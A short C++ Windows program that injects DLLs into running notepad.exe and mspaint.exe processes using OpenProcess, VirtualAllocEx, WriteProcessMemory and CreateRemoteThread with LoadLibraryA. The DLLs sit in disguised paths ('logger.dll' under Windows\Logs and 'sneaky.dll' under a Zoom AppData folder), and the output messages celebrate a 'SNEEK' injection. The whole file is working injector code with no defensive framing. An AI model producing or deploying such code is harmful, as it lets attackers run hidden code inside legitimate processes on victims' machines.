#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

DWORD GetProcessID(const char* processName) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe)) {
            do {
                if (_stricmp(pe.szExeFile, processName) == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
    }
    CloseHandle(hSnapshot);
    return pid;
}

bool InjectDLL(DWORD pid, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;

    void* pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteMemory) return false;

    WriteProcessMemory(hProcess, pRemoteMemory, dllPath, strlen(dllPath) + 1, NULL);
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA"), pRemoteMemory, 0, NULL);

    if (!hThread) return false;

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}

int main() {
    const char* dllPath = "C:\\Windows\\Logs\\logger.dll";
    const char* dllPath2 = "C:\\Users\\Tandoor_Wala\\AppData\\Roaming\\Zoom\\bin\\sneaky.dll"; 

    DWORD pid = GetProcessID("notepad.exe"); 

    if (pid) {
        if (InjectDLL(pid, dllPath)) {
            std::cout << "[+] Injection successful!" << std::endl;
        } else {
            std::cout << "[-] Injection failed!" << std::endl;
        }
    } else {
        std::cout << "[-] Process not found!" << std::endl;
    }

    DWORD pid2 = GetProcessID("mspaint.exe"); 
    if (pid2) {
        if (InjectDLL(pid2, dllPath2)) {
            std::cout << "[+] SNEEK successful!" << std::endl;
        } else {
            std::cout << "[-] Injection failed!" << std::endl;
        }
    } else {
        std::cout << "[-] Process not found!" << std::endl;
    }

    return 0;
}
